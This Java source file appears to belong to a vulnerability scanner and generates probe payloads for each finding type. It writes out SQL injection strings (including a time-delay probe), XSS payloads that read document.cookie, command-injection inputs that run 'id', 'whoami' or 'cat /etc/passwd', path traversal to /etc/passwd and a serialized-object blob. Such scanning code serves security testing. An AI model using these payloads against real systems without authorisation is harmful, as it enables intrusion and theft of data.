package com.oda.strike;

import com.oda.model.Finding;

import java.util.ArrayList;
import java.util.List;

/**
 * Context-aware payload generator — uses structural hints from TRACE (quotes, numeric SQL, XSS).
 */
public final class PayloadGenerator {

    private PayloadGenerator() {}

    public static List<String> generate(Finding finding) {
        List<String> payloads = new ArrayList<>();

        switch (finding.getType()) {
            case SQL_INJECTION -> {
                if (finding.isSingleQuoteWrapped()) {
                    payloads.add("' OR '1'='1");
                    payloads.add("' OR 1=1--");
                    payloads.add("' UNION SELECT null,null--");
                } else if (finding.isNumericContext()) {
                    payloads.add("1 OR 1=1");
                    payloads.add("0 UNION SELECT 1,2,3--");
                    payloads.add("-1 OR 1=1");
                } else {
                    payloads.add("' OR '1'='1");
                    payloads.add("1 OR 1=1");
                }
                payloads.add("'; WAITFOR DELAY '0:0:3'--");
            }
            case XSS -> {
                payloads.add("<script>alert('ODA-XSS')</script>");
                payloads.add("<img src=x onerror=alert(1)>");
                payloads.add("'><svg/onload=alert(1)>");
                payloads.add("javascript:alert(document.cookie)");
            }
            case COMMAND_INJECTION -> {
                payloads.add("; id");
                payloads.add("| whoami");
                payloads.add("&& cat /etc/passwd");
            }
            case PATH_TRAVERSAL -> {
                payloads.add("../../../../etc/passwd");
                payloads.add("%2e%2e%2fetc%2fpasswd");
            }
            case BROKEN_ACCESS_CONTROL -> {
                payloads.add("admin");
                payloads.add("administrator");
            }
            case SECURITY_MISCONFIGURATION -> {
                payloads.add("true");
            }
            case SUPPLY_CHAIN_FAILURE -> {
                payloads.add("1");
            }
            case CRYPTOGRAPHIC_FAILURE -> {
                payloads.add("md5");
            }
            case INSECURE_DESIGN -> {
                payloads.add("12345");
            }
            case AUTHENTICATION_FAILURE -> {
                payloads.add("true");
            }
            case INTEGRITY_FAILURE -> {
                payloads.add("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==");
            }
            case LOGGING_ALERTING_FAILURE -> {
                payloads.add("true");
            }
            case EXCEPTIONAL_CONDITIONS -> {
                payloads.add("null_pointer");
            }
        }

        return payloads;
    }
}
